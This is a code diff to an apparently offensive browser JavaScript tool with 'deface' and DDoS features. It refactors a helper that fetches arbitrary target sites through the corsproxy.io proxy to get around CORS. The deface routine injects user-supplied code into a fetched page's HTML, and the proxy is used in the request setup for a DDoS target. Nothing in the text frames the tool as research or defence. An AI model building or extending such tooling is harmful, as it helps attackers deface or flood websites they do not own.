@@ -67,7 +67,26 @@
  defaceInfo.style.marginBottom = "15px"; // Add margin
  defaceSection.appendChild(defaceInfo);
 
- const targetURLDeface = prompt("%cEnter target URL to deface:", "https://example.com", "color: #008000");
+ let targetURLDeface = prompt("%cEnter target URL to deface:", "https://example.com", "color: #008000");
+
+ // Function to bypass CORS using a proxy
+ const bypassCORS = async (url) => {
+  const proxyURL = `https://corsproxy.io/?${encodeURIComponent(url)}`;
+  try {
+   const response = await fetch(proxyURL, {
+    mode: 'cors'
+   });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   return await response.text();
+  } catch (error) {
+   console.error('Error bypassing CORS:', error);
+   alert(`CORS bypass failed: ${error}. Try a different URL.`);
+   return null;
+  }
+ };
+
  const backupButton = document.createElement("button");
  backupButton.textContent = "Backup Site";
  backupButton.style.backgroundColor = "#00008B"; // Dark blue
@@ -142,13 +161,12 @@
  const backupSite = async () => {
   try {
    log(`Attempting to backup ${targetURLDeface}`);
-   const response = await fetch(targetURLDeface, {
-    mode: 'cors'
-   }); // Added CORS mode
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
+   const siteContent = await bypassCORS(targetURLDeface);
+   if (!siteContent) {
+    return; // Exit if CORS bypass failed
    }
-   originalSiteContent = await response.text(); // Store in variable
+
+   originalSiteContent = siteContent; // Store in variable
    const blob = new Blob([originalSiteContent], {
     type: 'text/html'
    });
@@ -204,18 +222,11 @@
   try {
    log(`Attempting to deface ${targetURLDeface}`);
    const customCode = customCodeTextarea.value;
-
-   // Fetch the target website's content (using CORS proxy)
-   const corsProxyURL = `https://corsproxy.io/?${encodeURIComponent(targetURLDeface)}`;
-   const response = await fetch(corsProxyURL, {
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`Failed to fetch target website: ${response.status}`);
+   const originalHTML = await bypassCORS(targetURLDeface);
+   if (!originalHTML) {
+    return; // Exit if CORS bypass failed
    }
-   const originalHTML = await response.text();
 
-   // Inject the custom code into the original HTML
    const defacedHTML = originalHTML.replace('</body>', `${customCode}</body>`);
 
    // Display the defaced content (using an iframe)
@@ -349,7 +360,6 @@
 
    if (proxy) {
     log(`Using proxy: ${proxy}`);
-    // Use a CORS proxy to bypass CORS restrictions
     requestURL = `https://corsproxy.io/?${encodeURIComponent(targetURLDDoS)}`;
    }
 
